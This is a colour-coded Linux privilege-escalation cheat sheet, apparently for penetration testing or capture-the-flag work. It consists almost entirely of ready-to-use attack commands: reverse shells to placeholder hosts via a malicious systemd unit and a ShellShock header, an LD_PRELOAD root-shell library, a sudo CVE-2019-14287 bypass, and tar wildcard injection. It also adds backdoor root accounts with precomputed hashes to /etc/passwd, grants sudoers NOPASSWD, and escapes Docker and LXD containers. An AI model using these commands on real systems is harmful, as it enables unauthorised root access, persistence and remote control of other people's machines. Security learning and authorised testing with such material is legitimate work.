\033[0;34m##################################################################################
\033[1;35m=== TOOLS ===\033[0m
\033[0;31m- Linpeas -\033[0m
\033[0;31m# Download Linpeas script using either wget or curl\033[0m
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
\033[0;31m# or\033[0m
curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh

\033[0;31m# Run Linpeas script with different options:\033[0m
\033[0;31m# Perform all checks for deeper system enumeration (takes longer)\033[0m
./linpeas.sh -a
\033[0;31m# Superfast & stealth mode, bypassing some time-consuming checks\033[0m
./linpeas.sh -s
\033[0;31m# Specify a password for sudo -l and bruteforcing other users\033[0m
./linpeas.sh -P
\033[0;34m##################################################################################
\033[1;35m=== Service Exploitation ===\033[0m
\033[0;31m- (systemctl) example -\033[0m
[Unit]
Description=blablablabla

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ipaddress>/<port> 0>&1'

[Install]
WantedBy=multi-user.target

\033[0;31menable the service:\033[0m
/bin/systemctl enable /path/to/service
\033[0;31mor\033[0m
/bin/systemctl restart /path/to/service
\033[0;31metc...\033[0m

\033[0;31mon attacker machine:\033[0m
nc -lvnp <port>
\033[0;34m##################################################################################
\033[1;35m=== ShellShock ===\033[0m
\033[0;31m- via curl -\033[0m
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ipaddress>/<port> 0>&1' http://<target_ip>/cgi-bin/<test.cgi>

\033[0;31m- Exploit-DB -\033[0m
https://www.exploit-db.com/exploits/34900
https://www.exploit-db.com/exploits/34766
\033[0;34m##################################################################################
\033[1;35m=== OverlayFS / FUSE ===\033[0m
\033[0;31m- create a new user namespace mapping the current user to root -\033[0m
id
uid=1000(user) gid=1000(user) groups=1000(user)

unshare --user --map-user 0
id
uid=0(root) gid=0(root) groups=0(root)
\033[0;34m##################################################################################
\033[1;35m=== nginx missconfigurations ===\033[0m
\033[0;31m- requires sudo perm for nginx (dav_methods) -\033[0m
\033[1;31mSTEP 1.\033[0m
cp /etc/nginx/nginx.conf /tmp/nginx.conf

\033[1;31mSTEP 2.\033[0m
\033[0;31mEdit file to something like:\033[0m
\033[0;37m
user root;
worker_processes auto;
pid /run/nginx2.pid;
include /etc/nginx/modules-enabled/*.conf;
event {
    worker_connections 768;
}
http {
    server {
        listen 1337;
        location / {
            root /;
            autoindex on;
            dav_methods PUT;
        }
    }
}

\033[1;31mSTEP 3.\033[0m
/usr/sbin/nginx -c /tmp/nginx.conf

\033[1;31mSTEP 4.\033[0m
curl http://<target_ip>:1337
curl http://<target_ip>:1337/root/.ssh/authorized_keys --upload-file <id_rsa.pub>
chmod 400 id_rsa
ssh -i id_rsa root@<target_ip>
\033[0;34m##################################################################################
\033[1;35m=== LD_PRELOAD and NOPASSWD ===\033[0m
\033[0;31m- If LD_PRELOAD is explicitly defined in the sudoers file -\033[0
\033[0;31m# Add LD_PRELOAD to sudoers environment variables\033[0m
Defaults        env_keep += LD_PRELOAD

\033[0;31m# Compile a shared library using gcc\033[0m
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

\033[0;31m# The shell.so library source code:\033[0m
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
\033[0;34m##################################################################################
\033[1;35m=== Add User To /etc/passwd ===\033[0m
\033[0;31m# Add a new user 'pog' with password 'pog' to /etc/passwd\033[0m
\033[0;31m# Specify /bin/bash as the default shell\033[0m
pog:$6$D5xqgBo/o5/kesDR$qxXQed0cTHPkCifMM/BlqB42Hh2TfjXzGe6GkouStrRBqYA4VjKfoSCXObXRmWsW0kP7j3iDLJeoY44sqNLWX/:0:0:pog:/pog:/usr/bin/bash

\033[0;31m# For Zsh shell, use the following entry:\033[0m
pog:$6$D5xqgBo/o5/kesDR$qxXQed0cTHPkCifMM/BlqB42Hh2TfjXzGe6GkouStrRBqYA4VjKfoSCXObXRmWsW0kP7j3iDLJeoY44sqNLWX/:0:0:pog:/pog:/usr/bin/zsh
\033[0;34m##################################################################################
\033[1;35m=== sudo_inject ===\033[0m
\033[0;31m# Use sudo_inject tool available at: https://github.com/nongiach/sudo_inject\033[0m

\033[0;31m# Execute a command with sudo\033[0m
$ sudo whatever
[sudo] password for user:
\033[0;31m# Press <ctrl>+c since you don't have the password. \033[0m
\033[0;31m# This creates invalid sudo tokens.\033[0m
$ sh exploit.sh
.... wait 1 second
$ sudo -i
\033[0;31m# no password required :)\033[0m
id
> uid=0(root) gid=0(root) groups=0(root)
\033[0;34m##################################################################################
\033[1;35m=== CVE-2019-14287 ===\033[0m
\033[0;31m- vulnerable sudo version -\033[0m
\033[0;31m# Exploitable when a user has the following permissions (sudo -l)\033[0m
(ALL, !root) ALL

\033[0;31m# If you have a full TTY, you can exploit it like this\033[0m
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
\033[0;34m##################################################################################
\033[1;35m=== Wildcard * (tar) ===\033[0m
\033[0;31m- tar -\033[0m
\033[0;31m# create a file for exploitation\033[0m
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

\033[0;31m# vulnerable script\033[0m
tar cf archive.tar *
\033[0;34m##################################################################################
\033[1;35m=== Wildcard * (path escape) ===\033[0m
\033[0;31mif the user can run the following:\033[0m
User user may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

\033[0;31mthe wildcard can be abused to run other code:\033[0m
\033[0;31m(!OBS: make sure root has execute permissions on root.sh, safe bet --> chmod 777 root.sh)\033[0m
echo "/bin/bash" >> root.sh
sudo /bin/nice /notes/../home/user/root.sh
\033[0;34m##################################################################################
\033[1;35m=== Writable /etc/passwd ===\033[0m
\033[0;31m# Generate a password for the user 'sus'\033[0m
openssl passwd -1 -salt sus sus
mkpasswd -m SHA-512 sus
python2 -c 'import crypt; print crypt.crypt("sus", "$6$salt")'

\033[0;31m# Add the user 'sus' with the generated password to /etc/passwd\033[0m
sus:<GENERATED_PASSWORD_HERE>:0:0:sus:/root:/bin/bash

\033[0;31m# Example entry:\033[0m
sus:$1$sus$TzyKlv0/R/c28R.GAeLw.1:0:0:Sus:/root:/bin/bash
\033[0;34m##################################################################################
\033[1;35m=== Writable /etc/sudoers ===\033[0m
\033[0;31m# Add sudo permissions for a specific user 'username'\033[0m
echo "<username> ALL=(ALL:ALL) ALL">>/etc/sudoers

\033[0;31m# Allow 'username' to use sudo without a password\033[0m
echo "<username> ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers

\033[0;31m# Another example: Allow 'username' to run /bin/bash without a password\033[0m
echo "<username> ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
\033[0;34m##################################################################################
\033[1;35m=== NFS Root Squashing ===\033[0m
\033[0;31m# When no_root_squash appears in /etc/exports, the folder is shareable\033[0m
\033[0;31m# A remote user can mount it:\033[0m

\033[0;31m# Remote check the name of the folder\033[0m
showmount -e 10.10.10.10

\033[0;31m# Create a directory\033[0m
mkdir /tmp/nfsdir

\033[0;31m# Mount the directory\033[0m
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir
cd /tmp/nfsdir

\033[0;31m# Copy a desired shell\033[0m
cp /bin/bash .

\033[0;31m# Set suid permission\033[0m
chmod +s bash
\033[0;34m##################################################################################
\033[1;35m=== Shared library ===\033[0m
\033[0;31m- ldd -\033[0m
\033[0;31m# Identify shared libraries used by a binary (e.g., /opt/binary)\033[0m
ldd /opt/binary

\033[0;31m# Example output:\033[0m
linux-vdso.so.1 (0x00007ffe961cd000)
vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)

\033[0;31m# Create a library in /tmp and activate the path\033[0m
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
\033[0;34m##################################################################################
\033[1;35m=== Docker ===\033[0m
\033[0;31m# Docker - Mount the filesystem in a bash container, allowing you to edit /etc/passwd as root\033[0m
\033[0;31mthen add a backdoor account toor:password:\033[0m

docker run -it --rm -v $PWD:/mnt bash
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd

\033[0;31m# Docker - Interact with all processes running on the host and use the same NICs\033[0m
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash

\033[0;31m# Mounted Docker Socket escape\033[0m
\033[0;31m# Search for the Docker socket\033[0m
find / -name docker.sock 2>/dev/null
\033[0;31m# It's usually in /run/docker.sock\033[0m

\033[0;31m# List Docker images and choose one\033[0m
docker images

\033[0;31m# Run an image, mounting the host disk and chroot on it\033[0m
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

\033[0;31m# Get full access to the host via ns pid and nsenter CLI\033[0m
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

\033[0;31m# Get full privileges in a container without --privileged flag\033[0m
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
\033[0;34m##################################################################################
\033[1;35m=== LXC/LXD ===\033[0m
\033[0;31m# To escalate privileges, run a container with elevated privileges\033[0m
\033[0;31m# and mount the host filesystem inside\033[0m

\033[0;31m# Build an Alpine image using lxd-alpine-builder\033[0m
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

\033[0;31m# Import the image\033[0m
lxc image import ./alpine.tar.gz --alias myimage

\033[0;31m# Run the image with security.privileged=true\033[0m
lxc init myimage mycontainer -c security.privileged=true

\033[0;31m# Mount /root into the image\033[0m
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

\033[0;31m# Interact with the container\033[0m
lxc start mycontainer
lxc exec mycontainer /bin/sh
\033[0;34m##################################################################################
\033[1;35m=== knockd ===\033[0m
\033[0;31m- Open closed ports (script) -\033[0m 
\033[1;31mPorts can be found at /etc/knockd.conf\033[0m
for x in 4000 5000 6000; do
    nmap -Pn --host-timeout 201 --max-retries 0 -p $x $IP;
done

\033[0;34m##################################################################################
\033[1;35m=== deepce ===\033[0m
tool that determines if you are within a privileged container and how to escape it etc...

\033[0;34m##################################################################################\033[0m
\033[1;35m=== Searchsploit ===\033[0m
\033[0;31m- Use searchsploit to search for specific exploits -\033[0m
searchsploit "linux kernel <Ubuntu 16> Local Privilege Escalation" | grep "<4.>"

\033[0;34m##################################################################################\033[0m
\n
